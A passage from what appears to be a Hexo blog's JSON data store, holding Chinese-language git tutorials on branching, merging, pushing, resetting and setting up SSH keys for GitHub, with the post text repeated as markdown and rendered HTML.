class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch dev    </span><br><span class=\"line\">git checkout dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>本地当前分支</code>，分支前面带<code>&quot;*&quot;</code>表示当前分支，剩下的分支表示本地有的分支：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>远程全部分支</code>，白色的表示本地有的，红色的表示本地没有，仅在远程存在：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>修改代码、提交代码(当前的操作是在dev分支上进行)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add a.html</span><br><span class=\"line\">git commit -m &quot;提交文件a.html&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>分支合并(将dev合并到master)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master     </span><br><span class=\"line\">git merge dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -d dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除后，查看分支(此时看不到dev分支了)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>总结 ：工作中经常从<code>master</code>创建新分支，具体操作如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master   </span><br><span class=\"line\">git checkout -b  issues1234   </span><br><span class=\"line\">git push origin issues1234   </span><br><span class=\"line\">git add ..  </span><br><span class=\"line\">git commit -m &quot;***&quot;</span><br><span class=\"line\">git push origin issues1234</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li>注意：将本地分支branch1推到远端的branch2操作步骤：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin branch1:branch2</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>删除分支</p>\n<p>git branch -D issues1234 // 本地强制删除分支 issues1234    </p>\n<p>git push origin  :issues1234  //推到远程</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一、-创建与合并分支\"><a href=\"#一、-创建与合并分支\" class=\"headerlink\" title=\"一、 创建与合并分支\"></a>一、 创建与合并分支</h2><ol>\n<li>从master分支创建dev分支并切换到dev分支<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master    </span><br><span class=\"line\">git checkout -b dev</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li><p><code>git checkout -b dev</code> 等价于：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch dev    </span><br><span class=\"line\">git checkout dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>本地当前分支</code>，分支前面带<code>&quot;*&quot;</code>表示当前分支，剩下的分支表示本地有的分支：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>远程全部分支</code>，白色的表示本地有的，红色的表示本地没有，仅在远程存在：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>修改代码、提交代码(当前的操作是在dev分支上进行)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add a.html</span><br><span class=\"line\">git commit -m &quot;提交文件a.html&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>分支合并(将dev合并到master)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master     </span><br><span class=\"line\">git merge dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -d dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除后，查看分支(此时看不到dev分支了)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>总结 ：工作中经常从<code>master</code>创建新分支，具体操作如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master   </span><br><span class=\"line\">git checkout -b  issues1234   </span><br><span class=\"line\">git push origin issues1234   </span><br><span class=\"line\">git add ..  </span><br><span class=\"line\">git commit -m &quot;***&quot;</span><br><span class=\"line\">git push origin issues1234</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li>注意：将本地分支branch1推到远端的branch2操作步骤：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin branch1:branch2</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>删除分支</p>\n<p>git branch -D issues1234 // 本地强制删除分支 issues1234    </p>\n<p>git push origin  :issues1234  //推到远程</p>\n</li>\n</ol>\n"},{"title":"git使用指南","date":"2018-04-28T02:18:52.000Z","archives":"版本控制","_content":"# git使用\n\n## 第一步(安装/全局配置)\n**安装**\n+ 百度 git 然后下载安装\n\n**配置**\n    \n一次性配置,设置`username`和`email`，因为github每次`commit`都会记录他们\n\n+ $ git config --global user.name \"自定义名字\" (注册时填写的名字)\n+ $ git config --global user.email \"email@地址.com\"(注册的地址)\n\n**检验配置是否成功**\n+ 使用 `git config -l` 查看里面的 `user.name` 和 `email` 的值\n\n**查看git版本**\n+ git --version\n\n**创建公钥**\n  + 第一步 : 创建 `ssh-keygen -t rsa -C '[email地址]'`\n  + 第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的`id_rsa.pub`\n    - 进入c盘的`C:\\Users\\标准用户\\.ssh`（一般都是在这个文加下）生成了两个文件，用记事本打开`id_rsa.pub`，全选然后复制。\n  + 第三步 : 登录 github 设置公钥\n    - 进入github官网，选择`setting` -> `ssh and GPG keys` -> `new ssh key` 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。\n  + 选择则保存，然后进入git客户端输入：`ssh -T git@github.com`\n  + 如果`ssh key`配置成功的话，会看到以下效果\n    - $ ssh -T git@github.com\n    - Hi SunOfHomeBoy! You've successfully authenticated, but GitHub does not provide shell access.\n    - 您已经成功地进行了身份验证，但是GitHub不提供shell访问。\n\n## 第二步(初始化项目/本地配置)\n**git初始化**\n  + 在项目目录下 输入 \"git init\"\n\n**git简单命令**\n  + \"ls -a\" 查看项目目录\n\n  + \"git status\" 查看git状态 // 重要\n\n  + \"git add <文件名>\" 向git仓库提交一个文件 // 重要\n  \n  + \"$ git add .\" #把前目录下的所有文件全部添加到暂存区\n  \n  + \"git rm --cached <文件名>\" 从git中移除文件\n  \n  + \"git log\" 查看日志\n\n## 第三步(开始建立远程仓库连接)\n+ `git remote add origin git@github.com:yourName/yourRepo.git`\n\n  `yourName`和`yourRepo`表示你在`github的用户名`和`新建仓库`，加完之后进入.git\n\n  git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git\n\n  $ git push\n  fatal: The current branch dev has no upstream branch.\n  To push the current branch and set the remote as upstream, use\n\n    `git push --set-upstream origin dev`\n\n## 第四步(工作区与暂存区[版本库])\n+ 在git add 提交文件后 使用 \"git commit -m '一句话描述'\" 命令\n\n+ \"git push origin master\" 推送到远程服务器\n\n+ \"git pull origin master\" 从远程服务器拉取到本地\n\n+ \"git checkout -- <文件名>\"  放弃更改\n\n+ \"git reset ‘git log 打印出来的 commit 后面的字符串’ --hard\"  //回退到某个版本\n\n## 第五步(版本库管理)\n**git 删除本地分支**\n+ git branch -D br\n\n**git 删除远程分支**\n+ git push origin :br  (origin 后面有空格)\n+ git push origin 【空格】【冒号】【你的分支名字】\n+ git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】\n\n**git代码库回滚** (指将代码库某分支退回到以前的某个\"commit id\")\n本地代码库回滚\n+ git reset --hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除\n+ git reset --hard HEAD~3：将最近3次的提交回滚\n\n## 附：\n**Git 常用命令大全**\n(http://blog.csdn.net/dengsilinming/article/details/8000622)\n\n**如何使用git上传代码到github**\n(https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html)\n\n常用命令,仅供参考。\n\n## 单位，win10电脑\n  2017年12月29日 09:15:05\n  Ubuntu SSH:\n\n  $ ssh-keygen -t rsa -C '903317164@qq.com'\n\nGenerating public/private rsa key pair.\n\nEnter file in which to save the key (/home/LiSC/.ssh/id_rsa):\nCreated directory '/home/LiSC/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/LiSC/.ssh/id_rsa.\nYour public key has been saved in /home/LiSC/.ssh/id_rsa.pub.\n\nThe key fingerprint is:\n\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com\n\nThe key's randomart image is:\n\n+---[RSA 2048]----+\n|B+OO==o          |\n|o=.=+O           |\n| .+o*.=       .  |\n|  .oo..+     . . |\n|   ...+ S+  . .  |\n|     o  . + o. E |\n|      .  . + ..  |\n|       .  o . ...|\n|       .o.   . +o|\n+----[SHA256]-----+\n-----------------------------------------------\n~$ ssh-keygen -t rsa - c '903317164@qq.com\n生成公共/私有的rsa密钥对。\n输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):\n创建目录/ home / LiSC / . ssh。\n输入passphrase(没有密码):\n再次输入相同的密码:\n您的身份已经保存在/ home/ lisc/. ssh/id_rsa。\n\n您的公钥已保存在/ home/ lisc/.ssh/id_rsa.pub中。\n\n指纹的关键是:\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com\n\n关键的随机图像是:\n+ - - - - - -[RSA 2048]- - - - - +\n| | B + OO = = o\n| o =。= + O |\n| + o *。=。|\n|。","source":"_posts/GIT/git使用指南.md","raw":"---\ntitle: git使用指南\ndate: 2018-04-28 10:18:52\ntags: git\narchives: 版本控制\ncategories: git\n---\n# git使用\n\n## 第一步(安装/全局配置)\n**安装**\n+ 百度 git 然后下载安装\n\n**配置**\n    \n一次性配置,设置`username`和`email`，因为github每次`commit`都会记录他们\n\n+ $ git config --global user.name \"自定义名字\" (注册时填写的名字)\n+ $ git config --global user.email \"email@地址.com\"(注册的地址)\n\n**检验配置是否成功**\n+ 使用 `git config -l` 查看里面的 `user.name` 和 `email` 的值\n\n**查看git版本**\n+ git --version\n\n**创建公钥**\n  + 第一步 : 创建 `ssh-keygen -t rsa -C '[email地址]'`\n  + 第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的`id_rsa.pub`\n    - 进入c盘的`C:\\Users\\标准用户\\.ssh`（一般都是在这个文加下）生成了两个文件，用记事本打开`id_rsa.pub`，全选然后复制。\n  + 第三步 : 登录 github 设置公钥\n    - 进入github官网，选择`setting` -> `ssh and GPG keys` -> `new ssh key` 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。\n  + 选择则保存，然后进入git客户端输入：`ssh -T git@github.com`\n  + 如果`ssh key`配置成功的话，会看到以下效果\n    - $ ssh -T git@github.com\n    - Hi SunOfHomeBoy! You've successfully authenticated, but GitHub does not provide shell access.\n    - 您已经成功地进行了身份验证，但是GitHub不提供shell访问。\n\n## 第二步(初始化项目/本地配置)\n**git初始化**\n  + 在项目目录下 输入 \"git init\"\n\n**git简单命令**\n  + \"ls -a\" 查看项目目录\n\n  + \"git status\" 查看git状态 // 重要\n\n  + \"git add <文件名>\" 向git仓库提交一个文件 // 重要\n  \n  + \"$ git add .\" #把前目录下的所有文件全部添加到暂存区\n  \n  + \"git rm --cached <文件名>\" 从git中移除文件\n  \n  + \"git log\" 查看日志\n\n## 第三步(开始建立远程仓库连接)\n+ `git remote add origin git@github.com:yourName/yourRepo.git`\n\n  `yourName`和`yourRepo`表示你在`github的用户名`和`新建仓库`，加完之后进入.git\n\n  git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git\n\n  $ git push\n  fatal: The current branch dev has no upstream branch.\n  To push the current branch and set the remote as upstream, use\n\n    `git push --set-upstream origin dev`\n\n## 第四步(工作区与暂存区[版本库])\n+ 在git add 提交文件后 使用 \"git commit -m '一句话描述'\" 命令\n\n+ \"git push origin master\" 推送到远程服务器\n\n+ \"git pull origin master\" 从远程服务器拉取到本地\n\n+ \"git checkout -- <文件名>\"  放弃更改\n\n+ \"git reset ‘git log 打印出来的 commit 后面的字符串’ --hard\"  //回退到某个版本\n\n## 第五步(版本库管理)\n**git 删除本地分支**\n+ git branch -D br\n\n**git 删除远程分支**\n+ git push origin :br  (origin 后面有空格)\n+ git push origin 【空格】【冒号】【你的分支名字】\n+ git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】\n\n**git代码库回滚** (指将代码库某分支退回到以前的某个\"commit id\")\n本地代码库回滚\n+ git reset --hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除\n+ git reset --hard HEAD~3：将最近3次的提交回滚\n\n## 附：\n**Git 常用命令大全**\n(http://blog.csdn.net/dengsilinming/article/details/8000622)\n\n**如何使用git上传代码到github**\n(https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html)\n\n常用命令,仅供参考。\n\n## 单位，win10电脑\n  2017年12月29日 09:15:05\n  Ubuntu SSH:\n\n  $ ssh-keygen -t rsa -C '903317164@qq.com'\n\nGenerating public/private rsa key pair.\n\nEnter file in which to save the key (/home/LiSC/.ssh/id_rsa):\nCreated directory '/home/LiSC/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/LiSC/.ssh/id_rsa.\nYour public key has been saved in /home/LiSC/.ssh/id_rsa.pub.\n\nThe key fingerprint is:\n\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com\n\nThe key's randomart image is:\n\n+---[RSA 2048]----+\n|B+OO==o          |\n|o=.=+O           |\n| .+o*.=       .  |\n|  .oo..+     . . |\n|   ...+ S+  . .  |\n|     o  . + o. E |\n|      .  . + ..  |\n|       .  o . ...|\n|       .o.   . +o|\n+----[SHA256]-----+\n-----------------------------------------------\n~$ ssh-keygen -t rsa - c '903317164@qq.com\n生成公共/私有的rsa密钥对。\n输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):\n创建目录/ home / LiSC / . ssh。\n输入passphrase(没有密码):\n再次输入相同的密码:\n您的身份已经保存在/ home/ lisc/. ssh/id_rsa。\n\n您的公钥已保存在/ home/ lisc/.ssh/id_rsa.pub中。\n\n指纹的关键是:\nSHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com\n\n关键的随机图像是:\n+ - - - - - -[RSA 2048]- - - - - +\n| | B + OO = = o\n| o =。= + O |\n| + o *。=。|\n|。","slug":"GIT/git使用指南","published":1,"updated":"2018-05-05T01:18:27.984Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29p002bb8xjxy19mpcv","content":"<h1 id=\"git使用\"><a href=\"#git使用\" class=\"headerlink\" title=\"git使用\"></a>git使用</h1><h2 id=\"第一步-安装-全局配置\"><a href=\"#第一步-安装-全局配置\" class=\"headerlink\" title=\"第一步(安装/全局配置)\"></a>第一步(安装/全局配置)</h2><p><strong>安装</strong></p>\n<ul>\n<li>百度 git 然后下载安装</li>\n</ul>\n<p><strong>配置</strong></p>\n<p>一次性配置,设置<code>username</code>和<code>email</code>，因为github每次<code>commit</code>都会记录他们</p>\n<ul>\n<li>$ git config –global user.name “自定义名字” (注册时填写的名字)</li>\n<li>$ git config –global user.email “email@地址.com”(注册的地址)</li>\n</ul>\n<p><strong>检验配置是否成功</strong></p>\n<ul>\n<li>使用 <code>git config -l</code> 查看里面的 <code>user.name</code> 和 <code>email</code> 的值</li>\n</ul>\n<p><strong>查看git版本</strong></p>\n<ul>\n<li>git –version</li>\n</ul>\n<p><strong>创建公钥</strong></p>\n<ul>\n<li>第一步 : 创建 <code>ssh-keygen -t rsa -C &#39;[email地址]&#39;</code></li>\n<li>第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的<code>id_rsa.pub</code><ul>\n<li>进入c盘的<code>C:\\Users\\标准用户\\.ssh</code>（一般都是在这个文加下）生成了两个文件，用记事本打开<code>id_rsa.pub</code>，全选然后复制。</li>\n</ul>\n</li>\n<li>第三步 : 登录 github 设置公钥<ul>\n<li>进入github官网，选择<code>setting</code> -&gt; <code>ssh and GPG keys</code> -&gt; <code>new ssh key</code> 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。</li>\n</ul>\n</li>\n<li>选择则保存，然后进入git客户端输入：<code>ssh -T git@github.com</code></li>\n<li>如果<code>ssh key</code>配置成功的话，会看到以下效果<ul>\n<li>$ ssh -T git@github.com</li>\n<li>Hi SunOfHomeBoy! You’ve successfully authenticated, but GitHub does not provide shell access.</li>\n<li>您已经成功地进行了身份验证，但是GitHub不提供shell访问。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二步-初始化项目-本地配置\"><a href=\"#第二步-初始化项目-本地配置\" class=\"headerlink\" title=\"第二步(初始化项目/本地配置)\"></a>第二步(初始化项目/本地配置)</h2><p><strong>git初始化</strong></p>\n<ul>\n<li>在项目目录下 输入 “git init”</li>\n</ul>\n<p><strong>git简单命令</strong></p>\n<ul>\n<li><p>“ls -a” 查看项目目录</p>\n</li>\n<li><p>“git status” 查看git状态 // 重要</p>\n</li>\n<li><p>“git add &lt;文件名&gt;” 向git仓库提交一个文件 // 重要</p>\n</li>\n<li><p>“$ git add .” #把前目录下的所有文件全部添加到暂存区</p>\n</li>\n<li><p>“git rm –cached &lt;文件名&gt;” 从git中移除文件</p>\n</li>\n<li><p>“git log” 查看日志</p>\n</li>\n</ul>\n<h2 id=\"第三步-开始建立远程仓库连接\"><a href=\"#第三步-开始建立远程仓库连接\" class=\"headerlink\" title=\"第三步(开始建立远程仓库连接)\"></a>第三步(开始建立远程仓库连接)</h2><ul>\n<li><p><code>git remote add origin git@github.com:yourName/yourRepo.git</code></p>\n<p><code>yourName</code>和<code>yourRepo</code>表示你在<code>github的用户名</code>和<code>新建仓库</code>，加完之后进入.git</p>\n<p>git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git</p>\n<p>$ git push<br>fatal: The current branch dev has no upstream branch.<br>To push the current branch and set the remote as upstream, use</p>\n<p>  <code>git push --set-upstream origin dev</code></p>\n</li>\n</ul>\n<h2 id=\"第四步-工作区与暂存区-版本库\"><a href=\"#第四步-工作区与暂存区-版本库\" class=\"headerlink\" title=\"第四步(工作区与暂存区[版本库])\"></a>第四步(工作区与暂存区[版本库])</h2><ul>\n<li><p>在git add 提交文件后 使用 “git commit -m ‘一句话描述’” 命令</p>\n</li>\n<li><p>“git push origin master” 推送到远程服务器</p>\n</li>\n<li><p>“git pull origin master” 从远程服务器拉取到本地</p>\n</li>\n<li><p>“git checkout – &lt;文件名&gt;”  放弃更改</p>\n</li>\n<li><p>“git reset ‘git log 打印出来的 commit 后面的字符串’ –hard”  //回退到某个版本</p>\n</li>\n</ul>\n<h2 id=\"第五步-版本库管理\"><a href=\"#第五步-版本库管理\" class=\"headerlink\" title=\"第五步(版本库管理)\"></a>第五步(版本库管理)</h2><p><strong>git 删除本地分支</strong></p>\n<ul>\n<li>git branch -D br</li>\n</ul>\n<p><strong>git 删除远程分支</strong></p>\n<ul>\n<li>git push origin :br  (origin 后面有空格)</li>\n<li>git push origin 【空格】【冒号】【你的分支名字】</li>\n<li>git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】</li>\n</ul>\n<p><strong>git代码库回滚</strong> (指将代码库某分支退回到以前的某个”commit id”)<br>本地代码库回滚</p>\n<ul>\n<li>git reset –hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除</li>\n<li>git reset –hard HEAD~3：将最近3次的提交回滚</li>\n</ul>\n<h2 id=\"附：\"><a href=\"#附：\" class=\"headerlink\" title=\"附：\"></a>附：</h2><p><strong>Git 常用命令大全</strong><br>(<a href=\"http://blog.csdn.net/dengsilinming/article/details/8000622\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/dengsilinming/article/details/8000622</a>)</p>\n<p><strong>如何使用git上传代码到github</strong><br>(<a href=\"https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html\" target=\"_blank\" rel=\"noopener\">https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html</a>)</p>\n<p>常用命令,仅供参考。</p>\n<h2 id=\"单位，win10电脑\"><a href=\"#单位，win10电脑\" class=\"headerlink\" title=\"单位，win10电脑\"></a>单位，win10电脑</h2><p>  2017年12月29日 09:15:05<br>  Ubuntu SSH:</p>\n<p>  $ ssh-keygen -t rsa -C ‘903317164@qq.com’</p>\n<p>Generating public/private rsa key pair.</p>\n<p>Enter file in which to save the key (/home/LiSC/.ssh/id_rsa):<br>Created directory ‘/home/LiSC/.ssh’.<br>Enter passphrase (empty for no passphrase):<br>Enter same passphrase again:<br>Your identification has been saved in /home/LiSC/.ssh/id_rsa.<br>Your public key has been saved in /home/LiSC/.ssh/id_rsa.pub.</p>\n<p>The key fingerprint is:</p>\n<p>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com</p>\n<p>The key’s randomart image is:</p>\n<p>+—[RSA 2048]—-+<br>|B+OO==o          |<br>|o=.=+O           |<br>| .+o*.=       .  |<br>|  .oo..+     . . |<br>|   …+ S+  . .  |<br>|     o  . + o. E |<br>|      .  . + ..  |<br>|       .  o . …|<br>|       .o.   . +o|</p>\n<h2 id=\"—-SHA256-—–\"><a href=\"#—-SHA256-—–\" class=\"headerlink\" title=\"+—-[SHA256]—–+\"></a>+—-[SHA256]—–+</h2><p>~$ ssh-keygen -t rsa - c ‘903317164@qq.com<br>生成公共/私有的rsa密钥对。<br>输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):<br>创建目录/ home / LiSC / . ssh。<br>输入passphrase(没有密码):<br>再次输入相同的密码:<br>您的身份已经保存在/ home/ lisc/. ssh/id_rsa。</p>\n<p>您的公钥已保存在/ home/ lisc/.ssh/id_rsa.pub中。</p>\n<p>指纹的关键是:<br>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com</p>\n<p>关键的随机图像是:</p>\n<ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li>-[RSA 2048]- - - - - +<br>| | B + OO = = o<br>| o =。= + O |<br>| + o *。=。|<br>|。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"git使用\"><a href=\"#git使用\" class=\"headerlink\" title=\"git使用\"></a>git使用</h1><h2 id=\"第一步-安装-全局配置\"><a href=\"#第一步-安装-全局配置\" class=\"headerlink\" title=\"第一步(安装/全局配置)\"></a>第一步(安装/全局配置)</h2><p><strong>安装</strong></p>\n<ul>\n<li>百度 git 然后下载安装</li>\n</ul>\n<p><strong>配置</strong></p>\n<p>一次性配置,设置<code>username</code>和<code>email</code>，因为github每次<code>commit</code>都会记录他们</p>\n<ul>\n<li>$ git config –global user.name “自定义名字” (注册时填写的名字)</li>\n<li>$ git config –global user.email “email@地址.com”(注册的地址)</li>\n</ul>\n<p><strong>检验配置是否成功</strong></p>\n<ul>\n<li>使用 <code>git config -l</code> 查看里面的 <code>user.name</code> 和 <code>email</code> 的值</li>\n</ul>\n<p><strong>查看git版本</strong></p>\n<ul>\n<li>git –version</li>\n</ul>\n<p><strong>创建公钥</strong></p>\n<ul>\n<li>第一步 : 创建 <code>ssh-keygen -t rsa -C &#39;[email地址]&#39;</code></li>\n<li>第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的<code>id_rsa.pub</code><ul>\n<li>进入c盘的<code>C:\\Users\\标准用户\\.ssh</code>（一般都是在这个文加下）生成了两个文件，用记事本打开<code>id_rsa.pub</code>，全选然后复制。</li>\n</ul>\n</li>\n<li>第三步 : 登录 github 设置公钥<ul>\n<li>进入github官网，选择<code>setting</code> -&gt; <code>ssh and GPG keys</code> -&gt; <code>new ssh key</code> 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。</li>\n</ul>\n</li>\n<li>选择则保存，然后进入git客户端输入：<code>ssh -T git@github.com</code></li>\n<li>如果<code>ssh key</code>配置成功的话，会看到以下效果<ul>\n<li>$ ssh -T git@github.com</li>\n<li>Hi SunOfHomeBoy! You’ve successfully authenticated, but GitHub does not provide shell access.</li>\n<li>您已经成功地进行了身份验证，但是GitHub不提供shell访问。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二步-初始化项目-本地配置\"><a href=\"#第二步-初始化项目-本地配置\" class=\"headerlink\" title=\"第二步(初始化项目/本地配置)\"></a>第二步(初始化项目/本地配置)</h2><p><strong>git初始化</strong></p>\n<ul>\n<li>在项目目录下 输入 “git init”</li>\n</ul>\n<p><strong>git简单命令</strong></p>\n<ul>\n<li><p>“ls -a” 查看项目目录</p>\n</li>\n<li><p>“git status” 查看git状态 // 重要</p>\n</li>\n<li><p>“git add &lt;文件名&gt;” 向git仓库提交一个文件 // 重要</p>\n</li>\n<li><p>“$ git add .” #把前目录下的所有文件全部添加到暂存区</p>\n</li>\n<li><p>“git rm –cached &lt;文件名&gt;” 从git中移除文件</p>\n</li>\n<li><p>“git log” 查看日志</p>\n</li>\n</ul>\n<h2 id=\"第三步-开始建立远程仓库连接\"><a href=\"#第三步-开始建立远程仓库连接\" class=\"headerlink\" title=\"第三步(开始建立远程仓库连接)\"></a>第三步(开始建立远程仓库连接)</h2><ul>\n<li><p><code>git remote add origin git@github.com:yourName/yourRepo.git</code></p>\n<p><code>yourName</code>和<code>yourRepo</code>表示你在<code>github的用户名</code>和<code>新建仓库</code>，加完之后进入.git</p>\n<p>git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git</p>\n<p>$ git push<br>fatal: The current branch dev has no upstream branch.<br>To push the current branch and set the remote as upstream, use</p>\n<p>  <code>git push --set-upstream origin dev</code></p>\n</li>\n</ul>\n<h2 id=\"第四步-工作区与暂存区-版本库\"><a href=\"#第四步-工作区与暂存区-版本库\" class=\"headerlink\" title=\"第四步(工作区与暂存区[版本库])\"></a>第四步(工作区与暂存区[版本库])</h2><ul>\n<li><p>在git add 提交文件后 使用 “git commit -m ‘一句话描述’” 命令</p>\n</li>\n<li><p>“git push origin master” 推送到远程服务器</p>\n</li>\n<li><p>“git pull origin master” 从远程服务器拉取到本地</p>\n</li>\n<li><p>“git checkout – &lt;文件名&gt;”  放弃更改</p>\n</li>\n<li><p>“git reset ‘git log 打印出来的 commit 后面的字符串’ –hard”  //回退到某个版本</p>\n</li>\n</ul>\n<h2 id=\"第五步-版本库管理\"><a href=\"#第五步-版本库管理\" class=\"headerlink\" title=\"第五步(版本库管理)\"></a>第五步(版本库管理)</h2><p><strong>git 删除本地分支</strong></p>\n<ul>\n<li>git branch -D br</li>\n</ul>\n<p><strong>git 删除远程分支</strong></p>\n<ul>\n<li>git push origin :br  (origin 后面有空格)</li>\n<li>git push origin 【空格】【冒号】【你的分支名字】</li>\n<li>git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】</li>\n</ul>\n<p><strong>git代码库回滚</strong> (指将代码库某分支退回到以前的某个”commit 